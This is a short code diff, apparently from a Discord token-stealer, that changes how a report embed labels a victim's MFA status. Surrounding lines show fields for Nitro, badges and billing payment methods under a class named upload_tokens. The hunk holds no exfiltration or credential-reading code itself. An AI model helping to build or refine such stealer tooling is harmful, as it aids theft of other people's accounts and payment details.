@@ -346,7 +346,7 @@ class upload_tokens:
             embed.add_field(name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
             embed.add_field(name="<a:redboost:996004230345281546> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
             embed.add_field(name="<a:pinklv:996004222090891366> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
-            embed.add_field(name="<:mfa:1021604916537602088> MFA:", value=f"{mfa}", inline=True)
+            embed.add_field(name="MFA:", value=f"{mfa}", inline=True)
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
             
